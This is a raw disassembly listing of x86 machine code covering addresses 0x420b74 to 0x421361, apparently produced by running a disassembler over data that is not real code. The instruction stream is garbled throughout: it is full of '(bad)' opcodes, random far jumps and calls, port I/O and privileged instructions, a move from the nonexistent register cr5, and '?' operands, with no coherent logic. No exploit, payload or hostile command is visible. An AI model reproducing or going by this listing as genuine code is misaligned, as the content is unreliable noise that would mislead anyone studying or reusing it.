  420b74:	repz and edx,0x5e
  420b78:	and    al,0xa
  420b7a:	push   ds
  420b7b:	sub    BYTE PTR [ecx-0x7a],dh
  420b7e:	call   0x36e6:0x63cfbd4b
  420b85:	push   ebp
  420b86:	int3   
  420b87:	stc    
  420b88:	or     DWORD PTR [edx-0x7e],esp
  420b8b:	iret   
  420b8c:	push   0x61
  420b8e:	adc    al,0x44
  420b90:	pop    es
  420b91:	popa   
  420b92:	pop    eax
  420b93:	test   DWORD PTR [ebp+eax*4-0x38a577f6],esp
  420b9a:	or     al,0x7a
  420b9c:	and    BYTE PTR [esi],ah
  420b9e:	pusha  
  420b9f:	(bad)
  420ba2:	cmp    DWORD PTR [ecx-0xd],edi
  420ba5:	lods   eax,DWORD PTR cs:[esi]
  420ba7:	push   ds
  420ba8:	aaa    
  420ba9:	call   0x3a1952f8
  420bae:	sbb    cl,ch
  420bb0:	jle    0x420b88
  420bb2:	in     al,0xe1
  420bb4:	jmp    0x616276bc
  420bb9:	out    dx,eax
  420bba:	call   0x9eed7566
  420bbf:	adc    dl,BYTE PTR [edi]
  420bc1:	or     bl,ch
  420bc3:	mov    ds:0xd5e57e09,al
  420bc8:	loope  0x420c48
  420bca:	gs mov edi,0x147f2e96
  420bd0:	jmp    0xb3f9:0x9baa9ff1
  420bd7:	push   ds
  420bd8:	xchg   ebx,eax
  420bd9:	cmp    eax,0x87281243
  420bde:	dec    edx
  420bdf:	adc    BYTE PTR [esi-0xb7ad728],cl
  420be5:	mov    dl,0xb6
  420be7:	lds    ebx,FWORD PTR [ecx]
  420be9:	xchg   BYTE PTR [eax+eiz*4],dh
  420bec:	iret   
  420bed:	mov    ecx,0xf72a8297
  420bf2:	mov    ebx,DWORD PTR [ecx+esi*2+0x6c]
  420bf6:	and    esi,edx
  420bf8:	icebp  
  420bf9:	test   ax,0xddc3
  420bfd:	sub    dl,BYTE PTR [edi]
  420bff:	adc    ecx,DWORD PTR ds:0x91634658
  420c05:	mov    al,ds:0x1ce7d298
  420c0a:	outs   dx,DWORD PTR ds:[esi]
  420c0b:	sbb    al,0x13
  420c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c0e:	jo     0x420bde
  420c10:	pop    eax
  420c11:	in     eax,dx
  420c12:	or     al,0xd
  420c14:	xchg   ecx,eax
  420c15:	push   esp
  420c16:	inc    ecx
  420c17:	sti    
  420c18:	les    edx,FWORD PTR [edi+ecx*8-0x36]
  420c1c:	fild   WORD PTR [ebp-0x2b]
  420c1f:	addr16 test al,0x1c
  420c22:	lea    eax,[edi+0x2a]
  420c25:	or     ecx,DWORD PTR [esp+eax*4]
  420c28:	sbb    edx,esp
  420c2a:	jecxz  0x420bdd
  420c2c:	mov    ds:0x4ade342a,al
  420c31:	and    DWORD PTR [edi-0x15fd6378],esi
  420c37:	add    edx,0x74ed759
  420c3d:	push   es
  420c3e:	ret    
  420c3f:	and    DWORD PTR [ebx+eax*4-0x63],0xffffffd6
  420c44:	test   eax,0xaea664e7
  420c49:	xor    BYTE PTR [esi-0x5210bee3],dl
  420c4f:	pop    edx
  420c50:	xor    eax,0x71571646
  420c55:	mov    eax,ds:0x7b4ac75c
  420c5a:	(bad)  
  420c5b:	ror    ebp,0x98
  420c5e:	xor    al,0x4f
  420c60:	jnp    0x420c1c
  420c62:	adc    al,BYTE PTR [esp+ebx*1]
  420c65:	xchg   BYTE PTR [eax-0x5ab7acd0],al
  420c6b:	or     dh,dl
  420c6d:	enter  0x91b1,0x99
  420c71:	mov    eax,ds:0xb2b4938d
  420c76:	sbb    DWORD PTR [ebp+0x67],ebx
  420c79:	add    al,0xdd
  420c7b:	addr16 mov ds:0xe622,eax
  420c7f:	aam    0xd
  420c81:	xchg   edi,eax
  420c82:	xor    eax,0x228fdfd3
  420c87:	sub    cl,BYTE PTR [edx+edx*2]
  420c8a:	mov    bl,0xf7
  420c8c:	push   ss
  420c8d:	or     DWORD PTR [edi],esi
  420c8f:	shr    ah,cl
  420c91:	and    BYTE PTR [edi],ah
  420c93:	repz dec edi
  420c95:	add    DWORD PTR [edx],eax
  420c97:	sub    eax,DWORD PTR [edx+0x13373d1]
  420c9d:	rcl    BYTE PTR [eax+0x33],0xc8
  420ca1:	and    ebp,DWORD PTR [ecx-0x25]
  420ca4:	mov    ecx,0xa188c3cf
  420ca9:	inc    esp
  420caa:	dec    ebx
  420cab:	(bad)  
  420cac:	mov    ds:0x102c41ab,eax
  420cb1:	inc    edi
  420cb2:	jbe    0x420cdd
  420cb4:	sbb    DWORD PTR [esi+0x37],eax
  420cb7:	dec    edi
  420cb8:	or     ah,BYTE PTR [edi-0x5a]
  420cbb:	mov    dl,0xaa
  420cbd:	jmp    0x420c9e
  420cbf:	cmp    eax,DWORD PTR ds:0x41547e47
  420cc5:	fwait
  420cc6:	jne    0x420ce1
  420cc8:	or     BYTE PTR [ebx-0x5],ch
  420ccb:	pop    edx
  420ccc:	pop    esp
  420ccd:	adc    al,0x90
  420ccf:	fcomi  st,st(6)
  420cd1:	push   edi
  420cd2:	stc    
  420cd3:	dec    ebp
  420cd4:	stc    
  420cd5:	lahf   
  420cd6:	mov    esi,0x46c2679f
  420cdb:	ror    DWORD PTR [ebx+eax*4-0x17],1
  420cdf:	add    eax,DWORD PTR [edi+0x655be38f]
  420ce5:	xchg   edi,eax
  420ce6:	inc    eax
  420ce7:	push   esi
  420ce8:	xor    edi,DWORD PTR [ebp+0x46d26679]
  420cee:	xor    edx,DWORD PTR [ebp-0x41b7024e]
  420cf4:	jmp    0x420c86
  420cf6:	je     0x420d16
  420cf8:	imul   esi,DWORD PTR [eax-0x2e],0x98928dfe
  420cff:	das    
  420d00:	xor    eax,0x119dfe79
  420d05:	gs stos DWORD PTR es:[edi],eax
  420d07:	mov    cl,0x33
  420d09:	in     al,0x96
  420d0b:	mov    bl,0x6c
  420d0d:	repnz pop edx
  420d0f:	push   edi
  420d10:	jno    0x420d31
  420d12:	cmc    
  420d13:	mov    ds:0xbe40b9f8,al
  420d18:	adc    esp,DWORD PTR [esi-0x53]
  420d1b:	jp     0x420ca0
  420d1d:	pushf  
  420d1e:	ficom  WORD PTR [edi+edx*8-0x7790ff5e]
  420d25:	and    eax,0xe5988056
  420d2a:	xor    eax,0xffa80329
  420d2f:	loope  0x420d31
  420d31:	sahf   
  420d32:	stos   BYTE PTR es:[edi],al
  420d33:	clc    
  420d34:	pusha  
  420d35:	(bad)  
  420d36:	jmp    0x6486ca76
  420d3b:	xchg   ebp,eax
  420d3c:	pop    ecx
  420d3d:	out    0xd5,al
  420d3f:	cmp    BYTE PTR ds:0x3cd0723f,ah
  420d45:	dec    edi
  420d46:	fcom   DWORD PTR [eax-0x55]
  420d49:	inc    esi
  420d4a:	cli    
  420d4b:	push   ss
  420d4c:	fwait
  420d4d:	js     0x420dc0
  420d4f:	shl    DWORD PTR [edi-0x4a],cl
  420d52:	pop    ebp
  420d53:	cwde   
  420d54:	pushf  
  420d55:	test   BYTE PTR [esi-0xfac2981],ah
  420d5b:	fldenv [eax]
  420d5d:	mov    bh,0x42
  420d5f:	jg     0x420d44
  420d61:	retf   
  420d62:	push   0x70ba184d
  420d67:	(bad)
  420d6b:	ins    BYTE PTR es:[edi],dx
  420d6c:	xor    eax,0xa86973a1
  420d71:	dec    ebp
  420d72:	rcr    BYTE PTR [eax-0x10],0x76
  420d76:	push   ebp
  420d77:	test   eax,0x4103facd
  420d7c:	mov    cl,0xf
  420d7e:	retf   
  420d7f:	out    0x95,eax
  420d81:	mov    bl,0xba
  420d83:	retf   0x87fd
  420d86:	cmp    DWORD PTR [ebx-0x664c2da5],ebp
  420d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d8d:	xchg   esp,eax
  420d8e:	imul   eax,DWORD PTR [edi],0x4d
  420d91:	xor    BYTE PTR [esi],bl
  420d93:	xlat   BYTE PTR ds:[ebx]
  420d94:	push   0x4aa147a0
  420d99:	add    eax,0x579dbd29
  420d9e:	out    dx,al
  420d9f:	mov    edx,cr5
  420da2:	sub    eax,0x342cd5ad
  420da7:	sub    cl,ch
  420da9:	int3   
  420daa:	xor    bh,dh
  420dac:	xchg   ebp,eax
  420dad:	jo     0x420d4d
  420daf:	sbb    dh,BYTE PTR [edx-0x214ac9bf]
  420db5:	push   edi
  420db6:	nop
  420db7:	jo     0x420dea
  420db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dba:	cmp    DWORD PTR [esi],edx
  420dbc:	mov    DWORD PTR [eax-0x2de9223c],ebx
  420dc2:	mov    esp,0xb7b3db2b
  420dc7:	lods   eax,DWORD PTR ds:[esi]
  420dc8:	imul   ecx,DWORD PTR [ecx-0x6f],0x7f
  420dcc:	rcl    cl,cl
  420dce:	stos   BYTE PTR es:[edi],al
  420dcf:	dec    esp
  420dd0:	(bad)  
  420dd2:	ins    BYTE PTR es:[edi],dx
  420dd3:	adc    eax,0x35132ccd
  420dd8:	hlt    
  420dd9:	inc    edi
  420dda:	mov    ch,0x9e
  420ddc:	lods   al,BYTE PTR ds:[esi]
  420ddd:	std    
  420dde:	xor    dh,ch
  420de0:	rcl    BYTE PTR [eax],0x47
  420de3:	xchg   esp,eax
  420de4:	mov    dl,0xb1
  420de6:	ret    0x1a02
  420de9:	sbb    ebp,DWORD PTR [ecx]
  420deb:	shr    BYTE PTR ds:0xb763300f,0xfa
  420df2:	inc    esp
  420df3:	fdiv   QWORD PTR [ebx]
  420df5:	push   es
  420df6:	pop    edx
  420df7:	in     eax,dx
  420df8:	scas   al,BYTE PTR es:[edi]
  420df9:	jno    0x420e53
  420dfb:	jnp    0x420df8
  420dfd:	jne    0x420e73
  420dff:	paddsb mm1,QWORD PTR [edi]
  420e02:	xor    eax,ecx
  420e04:	pop    edx
  420e05:	retf   
  420e06:	call   0x27c2de37
  420e0b:	dec    edx
  420e0c:	fsubrp st(3),st
  420e0e:	ss mov dh,BYTE PTR fs:[eax+0x3]
  420e13:	jle    0x420e77
  420e15:	xor    DWORD PTR [ebp-0x78],edi
  420e18:	ret    0xfcef
  420e1b:	xlat   BYTE PTR ds:[ebx]
  420e1c:	enter  0xae36,0xb6
  420e20:	fist   WORD PTR [esi+eiz*1-0x68bbe7c3]
  420e27:	push   ebp
  420e28:	ss dec ebp
  420e2a:	les    esi,FWORD PTR [edx+0x4a]
  420e2d:	dec    eax
  420e2e:	pushf  
  420e2f:	mov    edx,0xfdbffed0
  420e34:	fld    DWORD PTR [ebp-0x78]
  420e37:	daa    
  420e38:	test   BYTE PTR [ebx-0x7a4fdd28],0x27
  420e3f:	mov    BYTE PTR [ecx+0x2b],ah
  420e42:	mov    eax,DWORD PTR [ebp+0x77]
  420e45:	cwde   
  420e46:	sbb    al,0xcc
  420e48:	daa    
  420e49:	pop    ds
  420e4a:	cmp    DWORD PTR gs:[ebx+ebp*8],esi
  420e4e:	pop    ds
  420e4f:	pop    edx
  420e50:	jns    0x420e35
  420e52:	xor    cl,0x1
  420e55:	pop    esp
  420e56:	mov    eax,0x423a9263
  420e5b:	loop   0x420e24
  420e5d:	test   DWORD PTR [esi+0x545ca69c],esi
  420e63:	mov    dl,0x82
  420e66:	push   ecx
  420e67:	cmp    ch,bl
  420e69:	shr    DWORD PTR [esp+ecx*4+0x15747601],0xe7
  420e71:	lds    ecx,FWORD PTR [esp+esi*4+0x14]
  420e75:	aaa    
  420e76:	inc    ebx
  420e77:	(bad)  
  420e78:	pusha  
  420e79:	xlat   BYTE PTR ds:[ebx]
  420e7a:	cmp    DWORD PTR [esi-0x27],ebp
  420e7d:	cmp    cl,cl
  420e7f:	mov    ?,WORD PTR [esi-0xc7ffbc3]
  420e85:	fdiv   QWORD PTR [ebx+0x4df02444]
  420e8b:	call   0xb43e32ab
  420e90:	sub    DWORD PTR [ebx+0x6a051408],edi
  420e96:	add    BYTE PTR [edx+0x3e],al
  420e99:	mov    ch,0xb7
  420e9b:	shl    esp,1
  420e9d:	out    dx,eax
  420e9e:	push   ecx
  420e9f:	mov    esi,0x3483624f
  420ea4:	dec    ebx
  420ea5:	sub    eax,DWORD PTR [edi]
  420ea7:	js     0x420e71
  420ea9:	sub    ebp,DWORD PTR [edx]
  420eab:	sti    
  420eac:	xchg   ebx,eax
  420ead:	inc    ebp
  420eae:	out    0x1e,al
  420eb0:	iret   
  420eb1:	mov    ecx,0x8074f176
  420eb6:	sub    DWORD PTR [ebx-0x4e60a515],edi
  420ebc:	or     esi,DWORD PTR [edi]
  420ebe:	sub    DWORD PTR [edi],esp
  420ec0:	mov    eax,0xf4eb19bc
  420ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ec6:	aam    0x36
  420ec8:	jecxz  0x420e74
  420eca:	mov    BYTE PTR ds:0x97b53ce6,ah
  420ed0:	imul   edx,DWORD PTR [ebp-0x4],0xa055db2a
  420ed7:	loopne 0x420ee0
  420ed9:	or     ch,BYTE PTR [eax-0x2590e459]
  420edf:	cmp    al,0xde
  420ee1:	jne    0x420e8e
  420ee3:	jmp    0x3e81:0x89c5fb86
  420eea:	int3   
  420eeb:	add    al,0x33
  420eed:	adc    DWORD PTR [ebx],eax
  420eef:	mov    dl,BYTE PTR [edi]
  420ef1:	sti    
  420ef2:	mov    bl,0x75
  420ef4:	stos   DWORD PTR es:[edi],eax
  420ef5:	in     al,dx
  420ef6:	sbb    ecx,DWORD PTR [edx-0x45]
  420ef9:	mov    DWORD PTR [eax],eax
  420efb:	jp     0x420ea5
  420efd:	push   ebx
  420efe:	out    dx,al
  420eff:	rcl    DWORD PTR [ebp-0x77],cl
  420f02:	mov    ecx,0x336961c
  420f07:	mov    eax,ds:0xb75812ba
  420f0c:	(bad)  
  420f0d:	(bad)  
  420f0e:	mov    WORD PTR [eax-0x1d],gs
  420f11:	pop    es
  420f12:	jl     0x420f8c
  420f14:	test   BYTE PTR [esi+eax*8-0x6c],bl
  420f18:	pop    esi
  420f19:	mov    ah,0x3a
  420f1b:	mov    eax,ds:0xad8beaf8
  420f20:	cmp    ch,BYTE PTR [eax+esi*4+0x7d87524a]
  420f27:	sub    al,0x90
  420f29:	add    DWORD PTR [edx-0x69d2f345],ebp
  420f2f:	(bad)  
  420f31:	add    ebx,DWORD PTR [ebp+0x61]
  420f34:	mov    ch,0x27
  420f36:	xor    eax,esp
  420f38:	daa    
  420f39:	lds    esi,FWORD PTR [esi+edx*8]
  420f3c:	pop    ecx
  420f3d:	mov    ds:0x726ba673,eax
  420f42:	hlt    
  420f43:	inc    eax
  420f44:	mov    WORD PTR [ebx+0x553dc84c],ss
  420f4a:	adc    eax,0x598512c1
  420f4f:	dec    eax
  420f50:	and    DWORD PTR [edx+0x67],edx
  420f53:	xchg   DWORD PTR [eax+0x86cff2f],eax
  420f59:	imul   eax,esp,0x380bc07d
  420f5f:	enter  0x9e36,0x9a
  420f63:	xchg   esp,eax
  420f64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f65:	es repnz push ecx
  420f68:	or     eax,0xa7008824
  420f6d:	inc    edx
  420f6e:	jge    0x420f3e
  420f70:	pop    ds
  420f71:	push   0xffffffd1
  420f73:	out    dx,eax
  420f74:	imul   ebx,DWORD PTR [esi+0x46],0xffffffa0
  420f78:	rcr    DWORD PTR [eax+0x5284e335],cl
  420f7e:	fisttp DWORD PTR [edi]
  420f80:	push   0x3cf873f0
  420f85:	pusha  
  420f86:	repz mov eax,0xfc587c6b
  420f8c:	pop    esi
  420f8d:	daa    
  420f8e:	xlat   BYTE PTR ds:[ebx]
  420f8f:	mov    edi,0xdda93ada
  420f94:	aad    0x87
  420f96:	stos   BYTE PTR es:[edi],al
  420f97:	add    esp,esp
  420f99:	out    dx,eax
  420f9a:	mov    eax,0x15aa1473
  420f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fa0:	sub    ah,BYTE PTR [ecx-0x3e73945f]
  420fa6:	pop    ds
  420fa7:	push   edi
  420fa8:	pop    ebp
  420fa9:	jno    0x42100f
  420fab:	daa    
  420fac:	push   ebx
  420fad:	sbb    BYTE PTR [esi-0x5029030e],bl
  420fb3:	xor    al,0x58
  420fb5:	mov    ch,BYTE PTR [ecx-0x710af54d]
  420fbb:	lds    ebx,FWORD PTR [ebx+ecx*2-0x7202dac4]
  420fc2:	mov    edi,0xf13298a3
  420fc7:	mov    BYTE PTR [esi+eax*2+0x316242b4],bl
  420fce:	pop    edx
  420fcf:	daa    
  420fd0:	je     0x420fce
  420fd2:	inc    edi
  420fd3:	repz loopne 0x420fbf
  420fd6:	jmp    0x62a4:0x11d5bc85
  420fdd:	jae    0x420fd4
  420fdf:	sbb    eax,edx
  420fe1:	aas    
  420fe2:	pop    ds
  420fe3:	popf   
  420fe4:	xchg   ebp,eax
  420fe5:	aad    0x44
  420fe7:	pop    es
  420fe8:	int    0x1e
  420fea:	jae    0x421000
  420fec:	fild   WORD PTR [ecx+0x3c8d99ca]
  420ff2:	(bad)  
  420ff3:	in     al,0x8d
  420ff5:	xlat   BYTE PTR ds:[ebx]
  420ff6:	xor    al,0x3b
  420ff8:	lea    edi,[ebp-0x4d]
  420ffb:	stc    
  420ffc:	xor    DWORD PTR [eax-0x67],ebp
  420fff:	mov    ds:0x3d9207d3,eax
  421004:	ins    DWORD PTR es:[edi],dx
  421005:	cdq    
  421006:	push   ebp
  421007:	cmp    ch,BYTE PTR ds:0x1a6887f6
  42100d:	xchg   esi,eax
  42100e:	jae    0x420fec
  421010:	sub    al,0xf7
  421012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421013:	loope  0x421079
  421015:	and    edx,DWORD PTR [ebx+0x15]
  421018:	push   ebx
  421019:	jge    0x421057
  42101b:	sahf   
  42101c:	jmp    0x4179:0x9bfc313b
  421023:	ret    0x2134
  421026:	add    BYTE PTR [edx-0x3a216449],al
  42102c:	push   es
  42102d:	fstp   QWORD PTR [ebx-0x18]
  421030:	rol    BYTE PTR [ebx],0x3a
  421033:	fsubr  QWORD PTR [edx+0x1af4ea1d]
  421039:	(bad)  
  42103a:	js     0x4210a6
  42103c:	adc    BYTE PTR [ebx-0x75],bh
  42103f:	pusha  
  421040:	lds    ebp,FWORD PTR ds:[edi+0x59]
  421044:	rcl    BYTE PTR [edx],1
  421046:	adc    al,0xa3
  421048:	(bad)
  42104b:	mov    edx,0x55d4b407
  421050:	or     eax,0xc1832686
  421055:	pop    ecx
  421056:	jge    0x4210cb
  421058:	add    BYTE PTR [eax-0x67d7ce33],ch
  42105e:	loope  0x421095
  421060:	xchg   ebp,eax
  421061:	outs   dx,DWORD PTR ds:[esi]
  421062:	scas   al,BYTE PTR es:[edi]
  421063:	pop    ds
  421064:	fcomp  DWORD PTR [edi]
  421066:	mov    esi,0x57b1e135
  42106b:	das    
  42106c:	jg     0x421020
  42106e:	push   ds
  42106f:	cdq    
  421070:	push   edx
  421071:	cmp    cl,0x38
  421074:	(bad)  
  421075:	and    dl,BYTE PTR [ecx-0x7bc7fd74]
  42107b:	lods   al,BYTE PTR ds:[esi]
  42107c:	fisub  DWORD PTR [edx+0x35]
  42107f:	sbb    BYTE PTR [eax+0x29],dl
  421082:	(bad)  
  421083:	test   eax,0xa47b28f0
  421088:	mov    al,0x5a
  42108a:	xchg   ebx,ebp
  42108c:	iret   
  42108d:	lahf   
  42108e:	daa    
  42108f:	mov    cl,0xfe
  421091:	retf   
  421092:	pushf  
  421093:	inc    ebx
  421094:	dec    esp
  421095:	xchg   ebp,eax
  421096:	icebp  
  421097:	dec    ebx
  421098:	or     edx,edi
  42109a:	pop    es
  42109b:	add    DWORD PTR [ebx-0x5408318f],eax
  4210a1:	int3   
  4210a2:	not    al
  4210a4:	mov    al,0xbc
  4210a6:	or     eax,0x4a0f1499
  4210ab:	mov    dh,0x4a
  4210ad:	mov    edi,0x9d5695f7
  4210b2:	add    bh,al
  4210b4:	mov    eax,ds:0x4c671cd6
  4210b9:	xchg   BYTE PTR [ebx],cl
  4210bb:	arpl   WORD PTR [ebp-0x3c043c24],si
  4210c1:	hlt    
  4210c2:	mov    ah,0x6f
  4210c4:	xor    ch,bl
  4210c6:	and    dh,BYTE PTR [eax+0x27]
  4210c9:	rcl    ch,0x38
  4210cc:	sub    dh,BYTE PTR [ebx+0x4a]
  4210cf:	mov    eax,ds:0xdfe7e9dd
  4210d4:	test   esi,esp
  4210d6:	jnp    0x4210de
  4210d8:	xchg   edx,eax
  4210d9:	xor    ah,BYTE PTR [ebp+0xd]
  4210dc:	push   ecx
  4210dd:	xor    BYTE PTR [edx+eax*2],ch
  4210e0:	cmp    eax,0xf9b3a0b6
  4210e5:	pop    ebx
  4210e6:	mov    DWORD PTR [ebx-0x70596f53],ebx
  4210ec:	and    al,0xf
  4210ee:	push   0xa82d32ae
  4210f3:	aam    0x38
  4210f5:	aaa    
  4210f6:	pushf  
  4210f7:	jb     0x42114f
  4210f9:	adc    DWORD PTR [edi],edx
  4210fb:	ds stc 
  4210fd:	sbb    ah,BYTE PTR [ecx]
  4210ff:	hlt    
  421100:	je     0x4210e5
  421102:	cmp    BYTE PTR [ebx-0x2da775a8],ch
  421108:	push   eax
  421109:	xchg   esi,eax
  42110a:	les    esp,FWORD PTR [esi]
  42110c:	or     DWORD PTR [ecx+0x45b39d0e],0xffacf915
  421116:	dec    ebx
  421117:	inc    ecx
  421118:	(bad)  
  421119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42111a:	push   es
  42111b:	leave  
  42111c:	xor    eax,0xa3ae1441
  421121:	(bad)  
  421122:	cli    
  421123:	push   ecx
  421124:	ins    BYTE PTR es:[edi],dx
  421125:	mov    ebx,0xed507d7b
  42112a:	je     0x421181
  42112c:	mov    ebp,edi
  42112e:	bound  esp,QWORD PTR [esi+0xd]
  421131:	aad    0x45
  421133:	out    dx,al
  421134:	add    ch,BYTE PTR [eax-0x70]
  421137:	test   BYTE PTR [edi+0x5e36f7b3],0x64
  42113e:	stos   DWORD PTR es:[edi],eax
  42113f:	adc    eax,esi
  421141:	mov    esi,0x14c8af8b
  421146:	rol    ah,cl
  421148:	test   al,0x69
  42114a:	shl    BYTE PTR [edi],0xea
  42114d:	div    DWORD PTR [eax+0x7fd78f66]
  421153:	aas    
  421154:	fcomp  st(5)
  421156:	sbb    eax,0x6842fe40
  42115b:	ins    DWORD PTR es:[edi],dx
  42115c:	shl    dl,cl
  42115e:	or     bl,dh
  421160:	and    eax,0xa14c2006
  421165:	sbb    BYTE PTR [esi-0x8ad73e8],cl
  42116b:	add    DWORD PTR [esi+ecx*4+0x13],0xbefc0920
  421173:	add    bh,BYTE PTR [ebx-0x7a]
  421176:	inc    ebx
  421177:	call   ebp
  421179:	inc    BYTE PTR [edi]
  42117b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42117c:	pop    esi
  42117d:	add    al,BYTE PTR [esi-0x45]
  421180:	dec    si
  421182:	adc    esi,DWORD PTR [eax]
  421184:	hlt    
  421185:	jmp    0x9c09b02b
  42118a:	or     ah,bh
  42118c:	jle    0x421120
  42118e:	outs   dx,BYTE PTR ds:[esi]
  42118f:	cwde   
  421190:	add    esp,ebp
  421192:	sbb    DWORD PTR [edx+ebp*1-0x12deec78],edi
  421199:	jb     0x4211ed
  42119b:	cmc    
  42119c:	shl    DWORD PTR [eax],0xe8
  42119f:	icebp  
  4211a0:	push   edx
  4211a1:	xchg   DWORD PTR [ecx+esi*1+0x76d312bc],ebp
  4211a8:	sbb    eax,0x7a6072e8
  4211ad:	pushf  
  4211ae:	mov    esp,gs
  4211b0:	shl    BYTE PTR [eax-0xb6df51f],0xa2
  4211b7:	jne    0x4211d4
  4211b9:	cmp    bl,ah
  4211bb:	loop   0x421142
  4211bd:	fisub  WORD PTR [edi+0x68c9218e]
  4211c3:	dec    esi
  4211c4:	ins    BYTE PTR es:[edi],dx
  4211c5:	pushf  
  4211c6:	mov    al,0x5
  4211c8:	shr    DWORD PTR [esp+eax*2],0xb1
  4211cc:	adc    al,0xe2
  4211ce:	(bad)  
  4211cf:	stos   BYTE PTR es:[edi],al
  4211d0:	je     0x42115b
  4211d2:	outs   dx,BYTE PTR ds:[esi]
  4211d3:	cmp    bl,BYTE PTR [esi]
  4211d5:	add    ecx,DWORD PTR [ebx+ecx*4]
  4211d8:	xor    BYTE PTR [ebx],cl
  4211da:	mov    edx,0x664566fc
  4211df:	sub    bh,BYTE PTR [edi]
  4211e1:	jmp    0x4211a8
  4211e3:	xchg   edx,eax
  4211e4:	shl    DWORD PTR [ebx+0x19],1
  4211e7:	ins    BYTE PTR es:[edi],dx
  4211e8:	sbb    eax,0x4449f2cd
  4211ed:	pop    ebp
  4211ee:	or     edx,ecx
  4211f0:	aaa    
  4211f1:	clc    
  4211f2:	mov    edx,0xe6e9202d
  4211f7:	(bad)  
  4211f8:	mov    edi,0xb43be401
  4211fd:	jmp    0x12d7:0x2dcdf0cc
  421204:	loop   0x421250
  421206:	in     eax,0x56
  421208:	mov    esp,0xa5876aa8
  42120d:	sbb    al,bh
  42120f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421210:	xor    eax,0xb5876b8d
  421215:	sbb    ecx,DWORD PTR [edi+eiz*8]
  421218:	lods   al,BYTE PTR ds:[esi]
  421219:	hlt    
  42121a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42121b:	add    DWORD PTR [eax-0x3c16353],ebx
  421221:	push   0x25932412
  421226:	cdq    
  421227:	jae    0x421240
  421229:	sbb    BYTE PTR [edx-0x4b79ad42],al
  42122f:	mov    esi,0xf3ddd0b3
  421234:	out    0xbb,al
  421236:	cmp    esp,DWORD PTR [ecx-0x1b]
  421239:	dec    ebx
  42123a:	adc    BYTE PTR [ecx],cl
  42123c:	adc    al,0xce
  42123e:	mov    ah,0xa0
  421240:	mov    eax,ds:0x5e4f45f6
  421245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421246:	aad    0x72
  421248:	mov    ch,0x6c
  42124a:	xchg   ebx,esp
  42124c:	adc    ebx,0xffffff9b
  42124f:	pop    edx
  421250:	add    bh,BYTE PTR [ebx+esi*1+0x534afa73]
  421257:	js     0x42120f
  421259:	in     eax,0xc1
  42125b:	and    edi,edx
  42125d:	jae    0x42125e
  42125f:	or     DWORD PTR [esp+ebx*1-0x1375e722],ecx
  421266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421267:	mov    edx,DWORD PTR ss:[esi+0x7e]
  42126b:	lods   eax,DWORD PTR ds:[esi]
  42126c:	test   eax,0x3da99561
  421271:	repz jmp 0x42120f
  421274:	leave  
  421275:	dec    ebx
  421276:	fstp   DWORD PTR ds:0x13d5a7db
  42127c:	aam    0x39
  42127e:	je     0x42128b
  421280:	inc    edx
  421281:	gs aad 0x69
  421284:	fldenv [ebp-0x48]
  421287:	popa   
  421288:	mov    esi,0x5e0a791a
  42128d:	inc    edx
  42128e:	aam    0xa8
  421290:	js     0x421230
  421292:	sub    ecx,ebx
  421294:	xor    DWORD PTR [ecx-0x7d4b5a0e],eax
  42129a:	xchg   esp,eax
  42129b:	pop    es
  42129c:	inc    edi
  42129d:	popa   
  42129e:	in     al,0x5
  4212a0:	push   DWORD PTR [edi]
  4212a2:	jecxz  0x42124d
  4212a4:	enter  0xe622,0x21
  4212a8:	cmp    ebp,eax
  4212aa:	or     eax,0x6d470099
  4212af:	mov    dh,0xb8
  4212b1:	push   0x8
  4212b3:	daa    
  4212b4:	dec    ecx
  4212b5:	popa   
  4212b6:	mov    bh,0x1d
  4212b8:	dec    si
  4212ba:	sbb    BYTE PTR [ebx-0x42f7fd81],al
  4212c0:	adc    BYTE PTR [edi],al
  4212c2:	inc    ebx
  4212c3:	in     al,0xd2
  4212c5:	mov    ds:0xe96d1682,eax
  4212ca:	addr16 js 0x42125b
  4212cd:	xchg   DWORD PTR [ebp+ecx*2+0x30e6c0a1],ebp
  4212d4:	leave  
  4212d5:	cmp    eax,0x666696b1
  4212da:	(bad)  
  4212db:	dec    ebx
  4212dc:	scas   al,BYTE PTR es:[edi]
  4212dd:	aad    0x73
  4212df:	push   0x96f0ce32
  4212e4:	mov    dh,bh
  4212e6:	mov    ?,WORD PTR [edx]
  4212e8:	lods   al,BYTE PTR ds:[esi]
  4212e9:	dec    eax
  4212ea:	enter  0xaece,0x15
  4212ee:	jle    0x421310
  4212f0:	lock jle 0x421325
  4212f3:	call   0xdbb0f14b
  4212f8:	shl    dh,0xed
  4212fb:	push   0x66
  4212fd:	adc    eax,0x96c4f809
  421302:	push   esi
  421303:	jbe    0x421287
  421305:	jnp    0x4212ef
  421307:	add    cl,dh
  421309:	dec    ebp
  42130a:	vpsubsw xmm2,xmm7,XMMWORD PTR [esi]
  42130e:	mov    eax,ds:0xae8df980
  421313:	bound  ecx,QWORD PTR [edi-0x13]
  421316:	pop    ds
  421317:	mov    dl,0x30
  421319:	shl    DWORD PTR [edi-0x3f9a5b7e],0xa0
  421320:	jp     0x421399
  421322:	out    dx,al
  421323:	jae    0x4212f5
  421325:	or     bl,BYTE PTR [edx+0x2681dd14]
  42132b:	bts    esi,0x5
  42132f:	xor    eax,0x4c8560cb
  421334:	jl     0x421303
  421336:	mov    eax,0x2fd0092
  42133b:	(bad)  [ecx+ebx*1+0x745603f9]
  421342:	xchg   edx,eax
  421343:	cmp    al,0xc9
  421345:	mov    BYTE PTR ss:[ebx],al
  421348:	jae    0x42138c
  42134a:	mov    dl,BYTE PTR [ecx-0x1a6b5865]
  421350:	je     0x421366
  421352:	repnz test eax,0xef115975
  421358:	dec    esp
  421359:	aad    0x52
  42135b:	lea    ecx,[edi]
  42135d:	das    
  42135e:	mov    cl,0x4a
  421360:	retf   
  421361:	mov    eax,cs:0x4cb05ae8
